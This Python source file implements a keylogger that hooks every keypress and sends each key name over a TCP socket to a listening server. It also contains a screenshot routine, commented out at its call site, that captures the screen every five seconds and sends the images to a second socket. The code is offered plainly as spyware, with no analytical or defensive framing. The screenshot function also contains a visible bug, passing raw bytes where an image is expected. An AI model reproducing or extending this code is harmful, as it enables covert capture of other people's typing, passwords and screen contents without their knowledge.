import keyboard
import socket
import sys
from PIL import ImageGrab
import time
import io

def send_message_to_server(client_socket,message):
    print("Sending")
    client_socket.sendall(message.encode())
def print_pressed_keys(key, client_socket):
    print("Pressed: ", key.name)
    message = f"Key pressed: {key.name}"
    send_message_to_server(client_socket,message)
def return_image_size(image):
    image_data = io.BytesIO()
    image.save(image_data, format='PNG')
    image_size = image_data.tell()
    image_data.close()
    return str(image_size)
def send_screenshot():
    SERVER_PORT = 12345
    SERVER_IP = '127.0.0.1'
    # Create a TCP/IP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server
    client_socket.connect((SERVER_IP, SERVER_PORT))

    while True:
            # Take a screenshot using PIL
         screenshot = ImageGrab.grab()
         image_data = io.BytesIO()
         screenshot.save(image_data, format='JPEG')
         image_data = image_data.getvalue()
         # Send the screenshot to the server
         client_socket.sendall(return_image_size(image_data).encode())
         client_socket.sendall(image_data)

            # Wait for some time before taking the next screenshot
         time.sleep(5)
#send_screenshot() #run screenshot fucntion
def keylogger():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'
    port = 1234
    connection_successful = False
    s.connect((host, port))
    print("Connected")
    connection_successful = True
    def on_key_pressed(key):
        print_pressed_keys(key, s)
    keyboard.on_press(on_key_pressed)
    if not connection_successful:
        print("Failed to connect to the server")
        s.close()
        sys.exit()
    keyboard.wait('esc')
    s.close()    
keylogger()   

